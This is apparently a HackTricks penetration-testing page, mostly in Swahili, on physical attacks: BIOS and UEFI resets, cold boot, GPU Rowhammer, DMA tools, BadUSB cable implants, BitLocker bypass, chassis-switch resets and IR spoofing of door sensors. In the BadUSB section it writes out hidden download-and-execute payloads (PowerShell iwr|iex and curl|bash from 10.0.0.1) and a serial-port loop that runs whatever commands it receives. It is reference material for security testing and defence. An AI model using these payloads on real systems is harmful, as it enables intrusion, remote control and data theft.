# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**Kurejesha upya BIOS** kunaweza kufanywa kwa njia kadhaa. Bodi nyingi za mama zinajumuisha **betri** ambayo, ikiondolewa kwa takriban **dakika 30**, huweka upya mipangilio ya BIOS, ikijumuisha nenosiri. Vinginevyo, **jumper kwenye motherboard** inaweza kurekebishwa ili kuweka upya mipangilio hii kwa kuunganisha pini mahususi.

Kwa hali ambapo marekebisho ya hardware hayawezekani au si ya vitendo, **zana za software** hutoa suluhisho. Kuendesha mfumo kutoka kwa **Live CD/USB** na distributions kama **Kali Linux** hutoa ufikiaji wa zana kama **_killCmos_** na **_CmosPWD_**, ambazo zinaweza kusaidia katika kurejesha nenosiri la BIOS.

Katika hali ambapo nenosiri la BIOS halijulikani, kulitandika vibaya **mara tatu** kwa kawaida husababisha code ya hitilafu. Code hii inaweza kutumika kwenye websites kama [https://bios-pw.org](https://bios-pw.org) ili huenda kupata nenosiri linaloweza kutumika.

### UEFI Security

Kwa mifumo ya kisasa inayotumia **UEFI** badala ya BIOS ya jadi, tool **chipsec** inaweza kutumika kuchanganua na kurekebisha mipangilio ya UEFI, ikijumuisha kuzima **Secure Boot**. Hili linaweza kufanywa kwa kutumia amri ifuatayo:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Uchambuzi wa RAM na Mashambulizi ya Cold Boot

RAM huhifadhi data kwa muda mfupi baada ya umeme kukatwa, kwa kawaida kwa **dakika 1 hadi 2**. Uendelevu huu unaweza kuongezwa hadi **dakika 10** kwa kutumia vitu baridi, kama liquid nitrogen. Katika kipindi hiki kilichoongezwa, **memory dump** inaweza kuundwa kwa kutumia tools kama **dd.exe** na **volatility** kwa uchambuzi.

---

## GPU Rowhammer Dhidi ya Page Tables

Mashambulizi ya kisasa ya GPU Rowhammer huwa muhimu zaidi yanapolenga **GPU virtual-memory metadata** badala ya ordinary buffers. Utafiti wa hivi karibuni kwenye **GDDR6 NVIDIA Ampere GPUs** unaonyesha kwamba attacker anayeendesha code isiyo na privilej inaweza kujenga GPU-specific hammering patterns, kutumia **memory massaging** kuweka paging structures katika rows zilizo hatarini, kisha kuflip bits katika **last-level page table** au intermediate **page directory**. Mara tu entry moja ya translation inapoharibika, attacker anaweza kuanzisha **arbitrary GPU memory read/write** kisha kuingia katika host compromise.

### Muundo wa Exploitation

1. **Profile hammerable rows** katika GDDR6 na ujenge refresh-aware / non-uniform hammering patterns zinazopitia mitigations za in-DRAM.
2. **Massage GPU allocations** ili driver aweke page-translation structures katika physical locations zinazoweza kupigwa hammer badala ya kuziacha katika default protected pool. Kivitendo hii inaweza kumaanisha kumaliza low-memory page-table region na kusambaza sparse UVM mappings kubwa kwa controlled strides.
3. **Flip translation metadata** kama **PFN** au aperture-related bits ndani ya page-table / page-directory entry ili virtual page inayodhibitiwa na attacker iresolve kwenda page-table pages, arbitrary GPU memory, au host-visible system mappings.
4. Tumia mapping iliyoghushiwa kuandika upya translation entries za ziada na kupandisha hadi **arbitrary GPU memory read/write** ndani ya GPU contexts.

### Host Pivot na Mitigations

- Ikiwa **IOMMU imezimwa**, forged system-aperture mappings zinaweza kufichua **host physical memory** yoyote kwa GPU, na hivyo kubadili primitive ya GPU kuwa host compromise kamili.
- **GDDRHammer** inalenga last-level page-table entries, wakati **GeForge** inaonyesha kwamba kuharibu page-directory level kunaweza kuwa rahisi zaidi kwa sababu bit flip moja inaweza kuelekeza tena subtree kubwa ya translation. Usichukulie tu layer moja ya paging kama security-critical.
- **IOMMU** bado ni muhimu kwa sababu inazuia njia ya moja kwa moja ya arbitrary-host-memory inayotumiwa na GDDRHammer/GeForge, lakini **si mitigation kamili**. **GPUBreach** inaonyesha pivot ya hatua ya pili ambapo attacker anaharibu GPU-writable, driver-owned CPU buffers kisha anachochea NVIDIA driver memory-safety bugs ili kupata kernel write primitive na **root shell** hata IOMMU ikiwa imewezeshwa.
- **System-level ECC** ni hatua ya practical hardening kwenye supported workstation/server GPUs. Consumer GPUs bila ECC huweka defense surface dhaifu zaidi.
- Mashambulizi haya si ya kinadharia tu: **GeForge** iliripoti **1,171** bit flips kwenye RTX 3060 na **202** kwenye RTX A6000, jambo ambalo lilitosha kujenga working host-privilege-escalation chain.

---

## Mashambulizi ya Direct Memory Access (DMA)

**INCEPTION** ni tool iliyoundwa kwa ajili ya **physical memory manipulation** kupitia DMA, inayooana na interfaces kama **FireWire** na **Thunderbolt**. Inaruhusu bypass ya login procedures kwa patching memory ili kukubali nenosiri lolote. Hata hivyo, haina ufanisi dhidi ya mifumo ya **Windows 10**.

---

## Live CD/USB kwa Access ya Mfumo

Kubadilisha system binaries kama **_sethc.exe_** au **_Utilman.exe_** na nakala ya **_cmd.exe_** kunaweza kutoa command prompt yenye system privileges. Tools kama **chntpw** zinaweza kutumika kuhariri faili ya **SAM** ya Windows installation, kuruhusu mabadiliko ya nenosiri.

**Kon-Boot** ni tool inayorahisisha kuingia kwenye mifumo ya Windows bila kujua nenosiri kwa kurekebisha kwa muda Windows kernel au UEFI. Taarifa zaidi zinaweza kupatikana kwenye [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Kushughulikia Windows Security Features

### Boot na Recovery Shortcuts

- **Supr**: Fikia BIOS settings.
- **F8**: Ingia Recovery mode.
- Kubonyeza **Shift** baada ya Windows banner kunaweza bypass autologon.

### BAD USB Devices

Devices kama **Rubber Ducky** na **Teensyduino** hutumika kama platforms za kuunda **bad USB** devices, zenye uwezo wa kutekeleza predefined payloads zinapounganishwa kwenye target computer.

### Volume Shadow Copy

Administrator privileges huruhusu kuundwa kwa nakala za files nyeti, ikiwemo file ya **SAM**, kupitia PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants kama **Evil Crow Cable Wind** hujificha ndani ya USB-A→USB-C au USB-C↔USB-C cables, hujionyesha tu kama USB keyboard, na huweka wazi C2 stack yao kupitia Wi-Fi. Operator anahitaji tu kuipa cable umeme kutoka kwenye victim host, kuunda hotspot yenye jina `Evil Crow Cable Wind` na password `123456789`, kisha kwenda kwenye [http://cable-wind.local/](http://cable-wind.local/) (au anwani yake ya DHCP) kufikia embedded HTTP interface.
- Browser UI hutoa tabs za *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, na *Config*. Stored payloads huwekewa tag kwa kila OS, keyboard layouts hubadilishwa papo hapo, na VID/PID strings zinaweza kubadilishwa ili kuiga peripherals zinazojulikana.
- Kwa kuwa C2 iko ndani ya cable, simu inaweza kuweka payloads, kuanzisha execution, na kusimamia Wi-Fi credentials bila kugusa host OS—inafaa kwa short dwell-time physical intrusions.

### OS-aware AutoExec payloads

- AutoExec rules hufunga payloads moja au zaidi ili zichomwe mara moja baada ya USB enumeration. Implant hufanya lightweight OS fingerprinting na kuchagua script inayofaa.
- Mfano wa workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa kuwa execution hufanyika bila uangalizi, kubadilisha tu charging cable kunaweza kupata “plug-and-pwn” initial access chini ya context ya user aliyeingia.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** Payload iliyohifadhiwa hufungua console na kubandika loop inayotekeleza chochote kinachofika kwenye new USB serial device. Toleo dogo la Windows ni:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Implant huweka kituo cha USB CDC wazi wakati ESP32-S3 yake inazindua TCP client (Python script, Android APK, au desktop executable) kurudi kwa operator. Bytes zozote zinazoandikwa kwenye session ya TCP hupitishwa kwenye serial loop hapo juu, hivyo kutoa remote command execution hata kwenye hosts zilizo air-gapped. Output ni ndogo, kwa hivyo operators kwa kawaida huendesha blind commands (creation ya account, staging ya tooling ya ziada, n.k.).

### HTTP OTA update surface

- The same web stack usually exposes unauthenticated firmware updates. Evil Crow Cable Wind listens on `/update` and flashes whatever binary is uploaded:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## Kuepuka BitLocker Encryption

BitLocker encryption inaweza kupitiwa kimkakati ikiwa **recovery password** itapatikana ndani ya faili ya memory dump (**MEMORY.DMP**). Tools kama **Elcomsoft Forensic Disk Decryptor** au **Passware Kit Forensic** zinaweza kutumika kwa madhumuni haya.

---

## Social Engineering kwa Kuongeza Recovery Key

Recovery key mpya ya BitLocker inaweza kuongezwa kupitia mbinu za social engineering, kwa kumshawishi user kutekeleza command inayoongeza recovery key mpya iliyoundwa kwa zero, hivyo kurahisisha mchakato wa decryption.

---

## Kutumia Chassis Intrusion / Maintenance Switches kufanyia Factory-Reset BIOS

Laptops nyingi za kisasa na small-form-factor desktops hujumuisha **chassis-intrusion switch** inayofuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Ingawa madhumuni makuu ya switch ni kutoa alert wakati device inafunguliwa, vendors wakati mwingine hutekeleza **undocumented recovery shortcut** ambayo husababishwa wakati switch inapobadilishwa katika pattern maalum.

### Jinsi Attack Inavyofanya Kazi

1. Switch imeunganishwa kwenye **GPIO interrupt** kwenye EC.
2. Firmware inayoendeshwa kwenye EC huweka rekodi ya **timing na number of presses**.
3. Wakati pattern iliyowekwa moja kwa moja kwenye code inatambuliwa, EC huanzisha routine ya *mainboard-reset* ambayo **hufuta contents za system NVRAM/CMOS**.
4. Katika boot inayofuata, BIOS hupakia default values – **supervisor password, Secure Boot keys, na all custom configuration hufutwa**.

> Mara Secure Boot inapozimwa na firmware password ikatoweka, attacker anaweza tu boot image yoyote ya external OS na kupata access isiyo na vikwazo kwenye internal drives.

### Mfano Halisi – Framework 13 Laptop

Recovery shortcut kwa Framework 13 (11th/12th/13th-gen) ni:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Baada ya mzunguko wa kumi EC huweka flag inayoiamuru BIOS kufuta NVRAM kwenye kuwasha upya kunakofuata. Utaratibu mzima unachukua takriban ~40 s na unahitaji **hakuna kitu ila screwdriver**.

### Generic Exploitation Procedure

1. Washa au fanya suspend-resume ya lengwa ili EC iwe inaendeshwa.
2. Ondoa kifuniko cha chini ili kufichua intrusion/maintenance switch.
3. Rudia vendor-specific toggle pattern (angalia documentation, forums, au reverse-engineer firmware ya EC).
4. Kusanya tena na uwashe upya – firmware protections zinapaswa kuwa zimezimwa.
5. Boot live USB (kwa mfano Kali Linux) na fanya post-exploitation ya kawaida (credential dumping, data exfiltration, implanting malicious EFI binaries, nk.).

### Detection & Mitigation

* Log chassis-intrusion events katika OS management console na ziunganishe na unexpected BIOS resets.
* Tumia **tamper-evident seals** kwenye screws/covers ili kugundua kufunguliwa.
* Weka vifaa katika **physically controlled areas**; chukulia kwamba physical access inamaanisha full compromise.
* Pale inapopatikana, zima vendor “maintenance switch reset” feature au hitaji cryptographic authorisation ya ziada kwa NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors huunganisha near-IR LED emitter na TV-remote style receiver module ambayo huripoti logic high tu baada ya kuona pulses nyingi (~4–10) za carrier sahihi (≈30 kHz).
- Plastic shroud huzuia emitter na receiver kutazamana moja kwa moja, kwa hiyo controller hudhani carrier yoyote iliyothibitishwa imetoka kwenye reflection ya karibu na huendesha relay inayofungua door strike.
- Mara controller inapoamini kuwa target ipo mara nyingi hubadilisha outbound modulation envelope, lakini receiver inaendelea kukubali burst yoyote inayolingana na filtered carrier.

### Attack Workflow
1. **Capture emission profile** – ambatisha logic analyser kwenye controller pins ili kurekodi waveform za kabla ya detection na baada ya detection zinazoendesha internal IR LED.
2. **Replay only the “post-detection” waveform** – ondoa/puuza stock emitter na endesha external IR LED kwa pattern ambayo tayari ime-trigger kuanzia mwanzo. Kwa kuwa receiver inajali tu pulse count/frequency, huchukulia spoofed carrier kama genuine reflection na huweka relay line active.
3. **Gate the transmission** – tuma carrier kwa bursts zilizotunishwa (kwa mfano, makumi ya milliseconds on, off kiasi sawa) ili kutoa minimum pulse count bila kusaturate AGC ya receiver au interference handling logic. Continuous emission hupunguza sensitivity ya sensor haraka na kuzuia relay kuwashwa.

### Long-Range Reflective Injection
- Kubadilisha bench LED na high-power IR diode, MOSFET driver, na focusing optics huwezesha triggering ya kuaminika kutoka umbali wa takriban ~6 m.
- Mshambuliaji hahitaji line-of-sight kwa receiver aperture; kulenga beam kwenye interior walls, shelving, au door frames zinazoweza kuonekana kupitia glass huruhusu reflected energy kuingia kwenye field of view ya takriban ~30° na huiga hand wave ya karibu.
- Kwa kuwa receivers hutegemea only weak reflections, external beam yenye nguvu zaidi inaweza kuruka off multiple surfaces na bado kubaki juu ya detection threshold.

### Weaponised Attack Torch
- Kuweka driver ndani ya commercial flashlight huficha tool hadharani. Badilisha visible LED na high-power IR LED iliyolingana na band ya receiver, ongeza ATtiny412 (au sawa) ili kuzalisha bursts za ≈30 kHz, na tumia MOSFET kushusha LED current.
- Telescopic zoom lens hubana beam kwa range/precision, wakati vibration motor chini ya MCU control hutoa haptic confirmation kwamba modulation inafanya kazi bila kutoa visible light.
- Kupitia patterns kadhaa zilizohifadhiwa za modulation (carrier frequencies na envelopes tofauti kidogo) huongeza compatibility kati ya rebranded sensor families, hivyo operator anaweza kuscan reflective surfaces hadi relay isikike ikibofya na door ifunguke.

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
